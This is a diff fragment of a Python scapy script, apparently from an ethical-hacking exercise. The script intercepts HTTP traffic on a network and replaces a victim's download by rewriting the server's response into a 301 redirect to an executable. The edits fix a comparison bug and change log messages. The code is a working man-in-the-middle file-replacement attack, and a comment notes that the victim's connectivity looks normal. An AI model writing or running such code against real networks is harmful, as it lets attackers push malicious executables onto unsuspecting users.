@@ -28,14 +28,14 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            print("\nHTTP Request outbound found:\n")
+            print("[+] HTTP Request outbound found")
             print(scapy_packet.show())
-        elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
+        elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
+            print("[+] HTTP Response Inbound found")
             if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("++Replacing file")
+                print("[+] Replacing file")
                 modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://rarlab.com/rar/wrar571.exe\n\n")
-                
                 packet.set_payload(str(modified_packet))
 
     packet.accept() #forward packets to target, connectivity seems normal
